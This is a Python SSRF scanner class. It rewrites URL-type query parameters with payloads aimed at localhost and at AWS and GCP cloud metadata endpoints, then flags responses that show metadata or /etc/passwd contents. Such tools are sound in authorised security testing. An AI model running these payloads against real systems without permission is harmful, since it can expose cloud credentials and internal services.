import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


class SSRFTester:
    """
    Advanced tester for detecting possible SSRF vulnerabilities.
    Includes payloads for local/internal addresses, cloud metadata, and test callbacks.
    """

    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.vulnerable = []

        # Diverse SSRF payloads: localhost, cloud metadata, DNS callbacks
        self.payloads = [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://169.254.169.254/latest/meta-data/",
            "http://0.0.0.0/",
            "http://[::1]/",
            "http://internal/",
            "http://169.254.169.254/computeMetadata/v1/",  # GCP
            "http://metadata.google.internal/",
            "http://aws.amazon.com/",  # harmless test
            # Example public callback: "http://burpcollaborator.net/"  (user would replace)
        ]

    def extract_url_params(self, url):
        """
        Extract URL parameters likely to contain URLs for SSRF.
        """
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        possible_params = {}
        for param, values in query_params.items():
            if any(kw in param.lower() for kw in ["url", "uri", "redirect", "next", "callback", "link"]):
                possible_params[param] = values[0]

        return parsed, possible_params

    def test_url(self, parsed, params):
        """
        Mutate parameters with SSRF payloads and test.
        """
        for param, original_value in params.items():
            for payload in self.payloads:
                new_query = parse_qs(parsed.query)
                new_query[param] = payload
                new_query_encoded = urlencode(new_query, doseq=True)

                new_parsed = parsed._replace(query=new_query_encoded)
                new_url = urlunparse(new_parsed)

                try:
                    resp = self.session.get(new_url, timeout=10)
                    clues = []

                    # Heuristic checks: local metadata IP or known SSRF signs
                    if "169.254" in resp.text:
                        clues.append("Cloud metadata IP detected")
                    if "root:x:" in resp.text:
                        clues.append("/etc/passwd leak pattern")
                    if "instance-id" in resp.text:
                        clues.append("AWS metadata signature")
                    if resp.status_code in [200, 302] and len(resp.text) > 50:
                        clues.append("Valid response with unusual payload")

                    if clues:
                        vuln = {
                            "url": new_url,
                            "param": param,
                            "original_value": original_value,
                            "payload": payload,
                            "vuln_type": "SSRF",
                            "severity": "High",
                            "evidence": f"Clues: {', '.join(clues)} | Snippet: {resp.text[:200]}"
                        }
                        self.vulnerable.append(vuln)
                        print(f"[+] Possible SSRF: {new_url} | Clues: {', '.join(clues)}")

                except requests.RequestException as e:
                    print(f"[!] SSRF test failed for {new_url}: {e}")

    def run(self, url_list):
        """
        Run SSRF tests on all URLs.
        """
        for url in url_list:
            parsed, params = self.extract_url_params(url)
            if params:
                self.test_url(parsed, params)
        return self.vulnerable
